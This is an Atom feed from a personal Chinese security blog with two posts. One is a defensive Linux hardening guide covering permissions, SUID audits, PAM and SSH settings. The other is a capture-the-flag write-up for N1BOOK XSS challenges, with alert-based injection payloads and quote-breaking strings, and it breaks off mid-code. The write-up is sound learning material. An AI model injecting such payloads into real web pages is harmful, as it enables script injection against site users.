<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4CH4N ZKUAN</title>
  
  <subtitle>透过现象看本质</subtitle>
  <link href="https://whoiszkuan.github.io/atom.xml" rel="self"/>
  
  <link href="https://whoiszkuan.github.io/"/>
  <updated>2021-11-05T07:23:02.372Z</updated>
  <id>https://whoiszkuan.github.io/</id>
  
  <author>
    <name>zkuan</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux-Security</title>
    <link href="https://whoiszkuan.github.io/2021/11/04/Linux-Security/"/>
    <id>https://whoiszkuan.github.io/2021/11/04/Linux-Security/</id>
    <published>2021-11-04T12:58:18.000Z</published>
    <updated>2021-11-05T07:23:02.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux系统安全"><a href="#Linux系统安全" class="headerlink" title="Linux系统安全"></a>Linux系统安全</h1><h2 id="账户安全"><a href="#账户安全" class="headerlink" title="账户安全"></a>账户安全</h2><h3 id="用户类型"><a href="#用户类型" class="headerlink" title="用户类型"></a>用户类型</h3><ul><li>超级用户<ul><li>用户名为root或者UID为0的用户，可以修改所有系统文件</li></ul></li><li>系统用户<ul><li>Linux系统所需的內建用户，不能登录，如bin、adm、lp等</li></ul></li><li>普通用户<ul><li>一般使用的用户都为普通用户</li></ul></li></ul><hr><h3 id="用户信息存储"><a href="#用户信息存储" class="headerlink" title="用户信息存储"></a>用户信息存储</h3><ul><li>用户信息文件<ul><li>/etc/passwd</li><li>/etc/shadow</li></ul></li><li>组信息文件<ul><li>/etc/group</li><li>/etc/gshadow</li></ul></li></ul><p>正常登录流程：</p><p>用户登录–&gt;是否有该用户–&gt;确认用户的<code>UID</code>–&gt;核实<code>shadow</code>文件的密码–&gt;成功登录</p><h4 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h4><p><strong>系统识别用户的文件，所有的用户信息都在文件中记录</strong></p><p><code>zkuan:x:500:500:zkuan sun:/home/zkuan:/bin/bash</code></p><ol><li>用户名（也被成为登录名）</li><li>口令；在例子中我们看到的是x，其实密码已经被映射到<code>/etc/shadow</code>文件中</li><li>UID；用户ID</li><li>GID；用户组ID</li><li>用户名全称，可选</li><li>用户的家目录所在位置</li><li>用户所用shell的类型</li></ol><h4 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h4><p><code>zkuan:$y$j9T$NRRMLswRhLY1$/k2zkdTk.deUPg2sx7.11WXPPXK67:18840:0:99999:7:::</code></p><p><strong>passwd的影子文件，两文件互补</strong></p><ol><li>用户名</li><li>密码（被加密）</li><li>上次修改口令的时间</li><li>两次修改口令的间隔</li><li>两次修改口令间隔最少的天数</li><li>两次修改口令间隔最多的天数</li><li>在口令过期之后多少天禁用次用户</li><li>用户过期日期</li><li>保留字段，目前为空</li></ol><h4 id="etc-group"><a href="#etc-group" class="headerlink" title="/etc/group"></a>/etc/group</h4><p><strong>具有共同特性的用户集合起来就是用户组</strong></p><p><code>root:x:0:root,linux</code></p><ol><li>用户组名称</li><li>用户组密码</li><li>GID</li><li>用户列表，每个用户之间用<code>,</code>号分割</li></ol><h4 id="etc-gshadow"><a href="#etc-gshadow" class="headerlink" title="/etc/gshadow"></a>/etc/gshadow</h4><p><strong>/etc/group的加密文件</strong></p><p><code>groupname:x:admin:admin</code></p><ol><li>用户组</li><li>用户组密码</li><li>用户组管理者</li><li>用户组成员</li></ol><hr><h3 id="用户认证方式"><a href="#用户认证方式" class="headerlink" title="用户认证方式"></a>用户认证方式</h3><h4 id="用户名-密码（SSH、Telnet、FTP）"><a href="#用户名-密码（SSH、Telnet、FTP）" class="headerlink" title="用户名+密码（SSH、Telnet、FTP）"></a>用户名+密码（SSH、Telnet、FTP）</h4><ul><li>包含数字、字母、下划线</li><li>容易暴力破解、密码丢失</li></ul><h4 id="基于证书（秘钥）"><a href="#基于证书（秘钥）" class="headerlink" title="基于证书（秘钥）"></a>基于证书（秘钥）</h4><ul><li>公钥保存在远程服务器，专用秘钥保存在本地</li><li>通过本地秘钥与服务器公钥进行配对认证登录</li><li>避免暴力破解</li></ul><h4 id="PAM（Pluggable-Authentication-Modules）"><a href="#PAM（Pluggable-Authentication-Modules）" class="headerlink" title="PAM（Pluggable Authentication Modules）"></a>PAM（Pluggable Authentication Modules）</h4><ul><li>适用于本地登录与远程登录的机制</li><li>很大灵活性，通过配置文件可设置多重认证方式，不同登录方式及不同策略</li><li>安全性较强</li></ul><hr><h3 id="用户访问文件权限分配"><a href="#用户访问文件权限分配" class="headerlink" title="用户访问文件权限分配"></a>用户访问文件权限分配</h3><p><code>drwxr-xr-x  3 zkuan zkuan      4096  8月  1 23:11  .vscode</code></p><ol><li>d:文件类型：<code>d</code>为文件夹，<code>-</code>为文件</li><li>rwx:文件拥有者的权限（User）</li><li>r-x:文件拥有者所在组其他用户的权限（Group）</li><li>r-x:系统中其他用户权限（Other）</li><li>2:链接数</li><li>zkuan:文件拥有者UID</li><li>zkuan:文件拥有者GID</li><li>4096:文件大小</li><li>8月  1 23:11:最后修改时间</li><li>.vscode:文件名</li></ol><hr><h3 id="权限表示方式"><a href="#权限表示方式" class="headerlink" title="权限表示方式"></a>权限表示方式</h3><p><strong>r–&gt;读(4)、w–&gt;写(2)、x–&gt;执行(1)</strong></p><p>chmod命令给文件设置权限：</p><blockquote><p>chmod 777 config</p><p>chmod u=rwx config</p></blockquote><table><thead><tr><th>-rw——-(600)</th><th>只有拥有者有读、写权限</th></tr></thead><tbody><tr><td><strong>-rw-r–r–</strong>(644)</td><td><strong>只有拥有者有读、写权限；而组用户和其他用户只有读权限</strong></td></tr><tr><td>-rwx——(700)</td><td><strong>只有拥有者有读、写、执行权限</strong></td></tr><tr><td>-rwxr-xr-x(755)</td><td><strong>拥有者读、写、执行；组用户和其他用户只有读、执行权限</strong></td></tr><tr><td>-rwx–x–x(711)</td><td><strong>拥有者读、写、执行；组用户和其他用户只有执行权限</strong></td></tr><tr><td>-rw-rw-rw-(666)</td><td><strong>所有用户都有读、写权限</strong></td></tr><tr><td>-rwxrwxrwx(777)</td><td><strong>所有用户都有读、写、执行权限</strong></td></tr></tbody></table><hr><h3 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h3><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><p>全称Set User ID,当小写字母<code>s</code>出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得文件拥有者的权限</p><p><code>-rwsr-xr-x 1 root root 63960  2月  7  2020 /usr/bin/passwd</code></p><p>文件拥有者的执行位上出现为<code>s</code>为不是<code>x</code>，所以说passwd这个程序具有SUID权限，因此在修改用户密码时用的就是<code>sudo passwd xxx</code>命令。</p><ul><li>如果在浏览文件时，发现文件所有者权限的第三位为大写<code>S</code>则表明该文件SUID无效</li></ul><p>SUID权限机制：</p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/SUID.png"></p><p><strong>使用SUID</strong>需要满足：</p><ol><li>SUID只对二进制文件有效，不能作用于目录或者脚本</li><li>调用者对该文件有执行权</li><li>在执行过程中调用者会暂时获得该文件的所有者权限</li><li>权限只在程序执行的过程中有效</li></ol><h4 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h4><p>全称Set Group ID,当小写字母<code>s</code>出现在文件用户组权限位上时，对普通二进制文件和目录都有效。作用于普通文件时，和SUID类似，用户将获得该文件所属组的权限；作用于目录时，当用户对某一目录有写和执行的权，可在该目录下建立文件，而该用户在这个目录建立的文件都属于这个目录的所属组</p><h4 id="SBIT"><a href="#SBIT" class="headerlink" title="SBIT"></a>SBIT</h4><p>全称Sticky Bit(粘滞位),小写字母<code>t</code>出现在其他用户权限的执行位上。当目录拥有SBIT权限时，该用户在这个目录下所建立的文件只有该用户和root用户可以删除。</p><p><code>drwxrwxrwt 26 root root 12288 11月  4 20:41 /tmp</code></p><ul><li>如果目录的其他用户权限执行位是大写<code>T</code>，则SBIT权限无效。</li></ul><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/tesqx.png"></p><hr><h3 id="三种特殊权限的设置"><a href="#三种特殊权限的设置" class="headerlink" title="三种特殊权限的设置"></a>三种特殊权限的设置</h3><p><strong>三个权限的对应数字为：SUID(4),SGID(2),SBIT(1)</strong></p><p>假设要设置文件夹权限为<code>-rwsr-xr-x</code>,由于s在所有者权限的执行位上，s为SUID，因此原先的755要在前面加上4，用<code>chmod 4755 config</code>赋予</p><p><strong>符号法设置特殊权限</strong></p><p>权限中的ugoa代表的是：</p><ul><li>u=user</li><li>g=group</li><li>o=other</li><li>a=all</li></ul><p>给所有人添加执行权限：<code>chmod a+x config</code></p><p>给所有者全部权限，所属组读写，其他人读权限：<code>chmod u=rwx,g=rw,o=r config</code></p><p>清除各种身份权限：<code>chmod a=- config</code></p><h2 id="账户风险和安全策略"><a href="#账户风险和安全策略" class="headerlink" title="账户风险和安全策略"></a>账户风险和安全策略</h2><h3 id="特权用户排查"><a href="#特权用户排查" class="headerlink" title="特权用户排查"></a>特权用户排查</h3><p><code>awk -F: '$3==0 {print $1}' /etc/passwd</code></p><p>![](<a href="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-05">https://gitee.com/zku4n/picgo/raw/master/img/2021-11-05</a> 09-37-48 的屏幕截图.png)</p><p>![](<a href="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-05">https://gitee.com/zku4n/picgo/raw/master/img/2021-11-05</a> 09-41-39 的屏幕截图.png)</p><ul><li>$3=0:取<code>/etc/passwd</code>中第三位值为0的用户</li><li>print $1:如果第三位值为0，便打印出第一位（用户名称）</li></ul><p>排查UID为0的用户，一般只有root用户UID为0</p><h3 id="账号密码生命周期"><a href="#账号密码生命周期" class="headerlink" title="账号密码生命周期"></a>账号密码生命周期</h3><p>对于采用静态口令认证的服务器，账户密码生命周期应小于90，且拒绝弱口令以及空口令</p><p>使用<code>more /etc/login.defs</code>检查相关参数</p><p>![](<a href="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-05">https://gitee.com/zku4n/picgo/raw/master/img/2021-11-05</a> 09-47-43 的屏幕截图.png)</p><ul><li><strong>PASS_MIN_LEN</strong>:设置密码最短长度</li></ul><h3 id="密码强度"><a href="#密码强度" class="headerlink" title="密码强度"></a>密码强度</h3><p>如果只使用<strong>PASS_MIN_LEN</strong>设置密码长度并不严谨，因为纯字母或纯数字也可以登录，为了保障用户密码强度，静态口令认证长度至少8位，并包括数字、小写字母、大写字母、特殊符号4类中至少2类</p><h4 id="etc-pam-d-system-auth"><a href="#etc-pam-d-system-auth" class="headerlink" title="/etc/pam.d/system-auth"></a><strong>/etc/pam.d/system-auth</strong></h4><p><code>password requisite pam_cracklib.so difok=3 minlen=8 ucredit=-1 lcredit=-1 dcredit=-1</code></p><p>新密码与旧密码不同的个数为3，至少8位，包含一位大写字母、一位小写字母、一位数字。</p><h3 id="用户锁定"><a href="#用户锁定" class="headerlink" title="用户锁定"></a>用户锁定</h3><p>配置用户连续认证失败次数超过10次，锁定用户账号。</p><h4 id="etc-pam-d-system-auth-1"><a href="#etc-pam-d-system-auth-1" class="headerlink" title="/etc/pam.d/system-auth"></a>/etc/pam.d/system-auth</h4><p><code>auth required pam_tally.so onerr=fail deny=10 unlock_time=300</code></p><p>密码连续错误10次，账号锁定300秒（5分钟）</p><ul><li>解锁用户<code>faillog -u (username) -r</code></li></ul><h3 id="访问权限控制"><a href="#访问权限控制" class="headerlink" title="访问权限控制"></a>访问权限控制</h3><h4 id="umask安全配置"><a href="#umask安全配置" class="headerlink" title="umask安全配置"></a>umask安全配置</h4><p>/etc/login.defs</p><p>![](<a href="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-05">https://gitee.com/zku4n/picgo/raw/master/img/2021-11-05</a> 10-38-55 的屏幕截图.png)</p><p><strong>umask的作用：</strong>默认情况下umask值为022（可用umask命令查看）</p><p>此时建立的文件默认权限是644(6-0,6-2,6-2)，建立文件夹默认权限是755(7-0,7-2,7-2)</p><p>022表示默认创建文件夹权限为755</p><p>027表示默认创建文件夹权限为750</p><h4 id="重要目录权限"><a href="#重要目录权限" class="headerlink" title="重要目录权限"></a>重要目录权限</h4><p>对于重要目录，建议执行以下操作</p><p><code>chmod -R 750 /etc/rc.d/init.d/*</code></p><p>只有root可以读写执行这个目录下的脚本</p><h3 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h3><h4 id="查看未授权的SUID-SGID"><a href="#查看未授权的SUID-SGID" class="headerlink" title="查看未授权的SUID/SGID"></a>查看未授权的SUID/SGID</h4><ul><li>SUID/SGID程序在运行时，将有效用户ID改变为该程序所有者(组)ID。因而可能存在一定的安全隐患，经常性的对比SUID/SGID文件列表，以便能够及时发现可以后门程序</li><li>找出文件中所有含s位的程序，把不必要的s位去掉，或者把根本不用的直接删除，这样可以防止用户滥用及提升权限的可能性<ul><li>查找SUID可执行程序<ul><li>find / -type f -perm -4000 -ls</li></ul></li><li>查找SGID可执行程序<ul><li>find / -type f -perm -2000 -ls</li></ul></li><li>查找SUID/SGID/或者两个都有<ul><li>find / -type f -perm -6000 -ls</li></ul></li></ul></li></ul><blockquote><p>find:查找命令</p><p>/:指定路径，根目录</p><p>-type:指定类型</p><p>f:文件类型</p><p>-perm:指定权限</p><p>-4000:权限</p><p>-ls:列出目录</p></blockquote><ul><li>-4000:至少满足4000权限</li></ul><h4 id="syslog登录事件记录"><a href="#syslog登录事件记录" class="headerlink" title="syslog登录事件记录"></a>syslog登录事件记录</h4><p><strong>/etc/rsyslog.conf</strong></p><h4 id="history时间戳"><a href="#history时间戳" class="headerlink" title="history时间戳"></a>history时间戳</h4><p>当遭受黑客入侵后，需要查看history命令记录，查看是否有删除或移动文件、修改配置等操作，配置history时间戳，便于分析、定位问题</p><p><strong>/etc/profile</strong></p><p><code>export HISTTIMEFORMAT= "%F %T 'whoami'"</code></p><h3 id="资源控制"><a href="#资源控制" class="headerlink" title="资源控制"></a>资源控制</h3><h4 id="登录超时"><a href="#登录超时" class="headerlink" title="登录超时"></a>登录超时</h4><p><strong>/etc/profile</strong></p><p>添加”TMOUT=”行开头的注释</p><h4 id="限制登录"><a href="#限制登录" class="headerlink" title="限制登录"></a>限制登录</h4><ul><li>禁止root远程登录<ul><li>/etc/ssh/sshd_config</li><li>确保PERMITROOTLOGIN为<code>On</code></li></ul></li><li>限定信任主机<ul><li>/etc/hosts.equiv</li><li>/$HOME/.RHOSTS</li><li>查看上述两个文件中的主机，删除其中不必要的主机，防止存在多余的信任主机</li><li>或直接关闭所有R系列远程服务<ul><li>RLOGIN</li><li>RSH</li><li>REXEC</li></ul></li></ul></li><li>禁用Telnet，使用SSH进行管理<ul><li>开启SSH服务：<code>systemctl start sshd</code></li></ul></li><li>限制能够登录本机的IP地址<ul><li>/etc/ssh/sshd_config<ul><li>ALLOWUSERS <a href="mailto:zkuan@10.0.0.123">zkuan@10.0.0.123</a><ul><li>允许zkuan通过地址10.0.0.123登录本机</li></ul></li><li>ALLOWUSERS *@10.0.*.*<ul><li>仅允许10.0.0.0/16网段的所有用户登录</li></ul></li></ul></li></ul></li></ul><h4 id="修改SSH配置"><a href="#修改SSH配置" class="headerlink" title="修改SSH配置"></a>修改SSH配置</h4><ul><li>修改端口Port:/etc/ssh/sshd_config</li><li>修改banner信息<ul><li>修改sshd_config<ul><li>/etc/ssh/sshd_config</li><li>如存在，则将banner字段设置为NONE</li></ul></li><li>修改motd<ul><li>/etc/motd</li><li>查看该文件内容，更新成自己想要添加的内容</li></ul></li></ul></li></ul><h3 id="入侵防范"><a href="#入侵防范" class="headerlink" title="入侵防范"></a>入侵防范</h3><ul><li>使用防火墙<ul><li>包过滤</li><li>NAT</li><li>数据包处理</li></ul></li><li>语法<ul><li>iptables [-t table] command [match][target]</li></ul></li><li>应用<ul><li>iptables -I input -s 192.168.1.0/24 -p tcp –dport 22 -j ACCEPT</li><li>只允许本机22端口被192.168.1.0/24访问</li></ul></li></ul><blockquote><p>-I:插入规则</p><p>input:插入栈数据(访问流量)</p><p>-s:源地址(访问主机IP)</p><p>-p:指定协议</p><p>tcp:TCP协议</p><p>–dport:目标端口</p><p>22:22端口</p><p>-j:目标跳转</p><p>ACCEPT:允许访问</p></blockquote><hr><h2 id="文件系统安全"><a href="#文件系统安全" class="headerlink" title="文件系统安全"></a>文件系统安全</h2><p>一切资源都为文件(包括硬件设备)</p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/linux_sys.png"></p><h3 id="文件和目录安全"><a href="#文件和目录安全" class="headerlink" title="文件和目录安全"></a>文件和目录安全</h3><p><strong>确保重要目录的权限设置，限制用户访问</strong></p><ul><li>排查任何人都有写权限的目录<ul><li>find / -xdev -type f \( -perm -0002 -a ! -perm -1000 \) -print</li><li>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print</li></ul></li></ul><blockquote><p>/:根目录</p><p>-xdev:只检查和指定目录在同一系统下的文件，避免出现其他系统的文件</p><p>-type:指定类型,f是文件，d是目录</p><p>-perm:按照文件权限查找文件</p><p>-0002:大于0002都列出来</p><p>-a:and的意思，条件并列</p><p>!:逻辑非</p><p>( -perm -0002 -a ! -perm -1000 \):权限大于0002，且排除1000权限</p><p>-print:打印符合条件的文件</p></blockquote><ul><li>配置默认的umask值为027</li><li>检查未授权SUID/SGID</li></ul><h3 id="文件目录权限"><a href="#文件目录权限" class="headerlink" title="文件目录权限"></a>文件目录权限</h3><ul><li>目录权限设置<ul><li>chmod [-cfvR] filename</li></ul></li><li>所有者和所有组设置<ul><li>chown [-cfhvR] user[:group] filename</li><li>demo:chown zkuan:zkuangroup /home/zkuan/config</li></ul></li></ul><hr><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="系统日志的分类"><a href="#系统日志的分类" class="headerlink" title="系统日志的分类"></a>系统日志的分类</h3><h4 id="Linux日志"><a href="#Linux日志" class="headerlink" title="Linux日志"></a>Linux日志</h4><p>日志的主要用途：</p><ol><li>系统审计：记录登录系统的用户和日常行动</li><li>监测追踪：系统遭受到攻击时如何追踪溯源到攻击者</li><li>分析统计：系统的性能、错误等统计</li></ol><h4 id="var-log-messages"><a href="#var-log-messages" class="headerlink" title="/var/log/messages"></a>/var/log/messages</h4><p>Linux最核心的日志文件，假如某个服务没有定义日志文件，那么该服务产生的日志文件就会记录到这个文件中，每周归档一次，默认只保留5次。归档的方法都是由”/etc/logrotate.conf”来控制</p><h4 id="var-log-wtmp"><a href="#var-log-wtmp" class="headerlink" title="/var/log/wtmp"></a>/var/log/wtmp</h4><p>查看用户的登录、注销信息，同时记录系统的启动、重启、关机等事件。不能cat直接查看，必须用<code>last</code>查看</p><h4 id="var-log-btmp"><a href="#var-log-btmp" class="headerlink" title="/var/log/btmp"></a>/var/log/btmp</h4><p>和wtmp类似，不能用cat直接查看，用lastb查看，记录用户登录无效的历史</p><h4 id="var-log-maillog"><a href="#var-log-maillog" class="headerlink" title="/var/log/maillog"></a>/var/log/maillog</h4><p>记录邮件相关的日志</p><h4 id="var-log-cron"><a href="#var-log-cron" class="headerlink" title="/var/log/cron"></a>/var/log/cron</h4><p><strong>记录系统定时任务相关的日志</strong></p><h4 id="var-log-cpus"><a href="#var-log-cpus" class="headerlink" title="/var/log/cpus"></a>/var/log/cpus</h4><p>记录cpu信息</p><h4 id="var-log-lastlog"><a href="#var-log-lastlog" class="headerlink" title="/var/log/lastlog"></a>/var/log/lastlog</h4><p>记录所有用户最后一次登录的时间，只能通过<code>lastlog</code>命令查看</p><h4 id="var-log-sudo-log"><a href="#var-log-sudo-log" class="headerlink" title="/var/log/sudo.log"></a>/var/log/sudo.log</h4><p>记录使用<code>sudo</code>发出的命令，需要先配置<code>/etc/sudoers</code>中<code>logfile=/var/log/sudo.log</code></p><h3 id="日志文件分析工具"><a href="#日志文件分析工具" class="headerlink" title="日志文件分析工具"></a>日志文件分析工具</h3><h4 id="logrotate"><a href="#logrotate" class="headerlink" title="logrotate"></a>logrotate</h4><p>支持日志的切割、压缩、清理以及邮件报警，通过<code>crontab</code>服务定时运行，也可用来管理自己的服务日志</p><p><strong>使用方法：</strong></p><ul><li>默认配置文件路径：/etc/logrotate.conf</li><li>单次执行测试：`logrotate -f /etc/logrotate.conf</li><li>定时执行：<code>/etc/crontab */5**\*\* root /sbin/logrotate /etc/logrotate.conf</code> 五分钟执行一次 </li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux系统安全&quot;&gt;&lt;a href=&quot;#Linux系统安全&quot; class=&quot;headerlink&quot; title=&quot;Linux系统安全&quot;&gt;&lt;/a&gt;Linux系统安全&lt;/h1&gt;&lt;h2 id=&quot;账户安全&quot;&gt;&lt;a href=&quot;#账户安全&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>N1BOOK-XSS</title>
    <link href="https://whoiszkuan.github.io/2021/11/04/N1BOOK-XSS/"/>
    <id>https://whoiszkuan.github.io/2021/11/04/N1BOOK-XSS/</id>
    <published>2021-11-04T08:58:37.000Z</published>
    <updated>2021-11-04T09:05:14.624Z</updated>
    
    <content type="html"><![CDATA[<h1 id="N1BOOK-XSS"><a href="#N1BOOK-XSS" class="headerlink" title="N1BOOK-XSS"></a>N1BOOK-XSS</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>直接构造payload看网页反应</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>传入参数：<code>username=&lt;script&gt;alert()&lt;/script&gt;</code></p><p>审计源代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    location<span class="token punctuation">.</span>search <span class="token operator">=</span> <span class="token string">"?username=xss"</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token string">'&lt;script&gt;alert(/xss/)&lt;/script&gt;'</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token string">"Welcome "</span> <span class="token operator">+</span> <span class="token function">escape</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>escape()函数对字符串进行了编码</p></blockquote><p>发现<code>&lt;script&gt;alert()&lt;/script&gt;</code>被username用单引号包裹，尝试闭合，并将后面的单引号注释掉。</p><p>写入payload：<code>username=';alert();//</code></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>传入参数：<code>username=&lt;script&gt;alert()&lt;/script&gt;</code></p><p>审计源代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    location<span class="token punctuation">.</span>search <span class="token operator">=</span> <span class="token string">"?username=xss"</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token string">'&lt;script&gt;alert()&lt;/script&gt;'</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token string">"Welcome "</span> <span class="token operator">+</span> username<span class="token punctuation">;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload被包裹，尝试闭合：<code>var username = '\';alert();';</code></p><p>单引号被转义，尝试两个单引号：<code>'';alert();//</code></p><p>闭合成功：<code>var username = '\'';alert();//';</code></p><h4 id="还有另外一种方法"><a href="#还有另外一种方法" class="headerlink" title="还有另外一种方法"></a>还有另外一种方法</h4><p>写入<code>&lt;img&gt;</code>标签，<code>alert()</code>用onclick等以<strong>on</strong>开头的事件表示。</p><p>payload：<code>&lt;img src=1 onclick=alert();&gt;</code></p><p><code>on</code>事件概览：</p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/incident.jpeg"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>查看源代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>    <span class="token keyword">var</span> time <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> jumpUrl<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    jumpUrl <span class="token operator">=</span> location<span class="token punctuation">.</span>href<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    jumpUrl <span class="token operator">=</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">jump</span><span class="token punctuation">(</span><span class="token parameter">time</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>time <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    location<span class="token punctuation">.</span>href <span class="token operator">=</span> jumpUrl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    time <span class="token operator">=</span> time <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">页面</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>time<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">秒后将会重定向到</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">escape</span><span class="token punctuation">(</span>jumpUrl<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token parameter">variable</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span><span class="token 